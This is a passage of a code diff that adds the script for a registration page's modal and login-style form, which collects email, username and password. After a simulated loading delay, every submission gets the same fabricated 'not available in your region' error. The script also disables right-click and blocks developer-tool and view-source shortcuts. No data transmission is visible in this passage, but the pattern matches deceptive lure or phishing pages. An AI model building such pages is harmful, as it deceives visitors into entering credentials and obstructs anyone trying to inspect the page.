+                    modal.classList.remove('hidden');
+                    
+                    // Show loading
+                    const originalContent = modalBody.innerHTML;
+                    modalBody.innerHTML = `
+                        <div class="w-10 h-10 border-4 border-t-blue-500 border-gray-200 rounded-full animate-spin mb-4"></div>
+                        <div class="text-gray-800">Loading...</div>
+                    `;
+                    
+                    // After 2 seconds show error message with icon
+                            setTimeout(() => {
+                        modalBody.innerHTML = `
+                            <svg class="w-12 h-12 text-red-500 mb-4" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd"></path>
+                            </svg>
+                            <div class="text-gray-800 text-center font-medium">This type of registration is not available in your region.</div>
+                        `;
+                            }, 2000);
+                    });
+                
+                    closeButton.addEventListener('click', function() {
+                    modal.classList.add('hidden');
+                });
+                
+                // Close modal when clicking outside
+                window.addEventListener('click', function(event) {
+                    if (event.target === modal) {
+                        modal.classList.add('hidden');
+                    }
+                });
+                
+                // Form submission handling
+                const form = document.getElementById('registration-form');
+                const continueButton = document.getElementById('continue-button');
+                const formLoadingState = document.querySelector('.form-loading-state');
+                
+                form.addEventListener('submit', function(e) {
+                        e.preventDefault();
+                        
+                    // Hide form and show loading
+                    form.classList.add('hidden');
+                    formLoadingState.classList.remove('hidden');
+                    
+                    // After 2 seconds show error message
+                        setTimeout(() => {
+                            formLoadingState.innerHTML = `
+                            <button class="absolute top-4 left-4 text-white flex items-center" id="back-button">
+                                <svg class="w-4 h-4 mr-1" viewBox="0 0 24 24">
+                                        <path fill="currentColor" d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"></path>
+                                    </svg>
+                                    Back
+                                </button>
+                            <div class="text-center text-white error-message">This type of registration is not available in your region.</div>
+                            `;
+                            
+                            // Add back button functionality
+                        document.getElementById('back-button').addEventListener('click', function() {
+                            formLoadingState.classList.add('hidden');
+                            form.classList.remove('hidden');
+                        });
+                        }, 2000);
+                    });
+                
+                // Form validation
+                const emailInput = document.getElementById('email');
+                const usernameInput = document.getElementById('username');
+                const passwordInput = document.getElementById('password');
+                
+                function validateEmail(email) {
+                    const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+                    return re.test(String(email).toLowerCase());
+                }
+                
+                function validateUsername(username) {
+                    const re = /^[a-zA-Z0-9_.]+$/;
+                    return username.length > 2 && re.test(String(username));
+                }
+                
+                function validatePassword(password) {
+                    return password.length >= 8;
+                }
+                
+                function updateFormValidity() {
+                    const isEmailValid = validateEmail(emailInput.value);
+                    const isUsernameValid = validateUsername(usernameInput.value);
+                    const isPasswordValid = validatePassword(passwordInput.value);
+                    
+                    if (isEmailValid && isUsernameValid && isPasswordValid) {
+                        continueButton.disabled = false;
+                        continueButton.classList.remove('opacity-50');
+                    } else {
+                        continueButton.disabled = true;
+                        continueButton.classList.add('opacity-50');
+                    }
+                }
+                
+                emailInput.addEventListener('input', updateFormValidity);
+                usernameInput.addEventListener('input', updateFormValidity);
+                passwordInput.addEventListener('input', updateFormValidity);
+                
+                // Initial button state
+                continueButton.disabled = true;
+                continueButton.classList.add('opacity-50');
+                
+                // Content protection
+                document.addEventListener('contextmenu', function(e) {
+                    e.preventDefault();
+                    return false;
+                });
+                
+                document.addEventListener('keydown', function(e) {
+                    // Block F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+                    if (
+                        e.keyCode === 123 || 
+                        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || 
+                        (e.ctrlKey && e.keyCode === 85)
+                    ) {
+                        e.preventDefault();
+                        return false;
+                    }
+                });
+            });
+        </script>
+    
+
+</body></html>
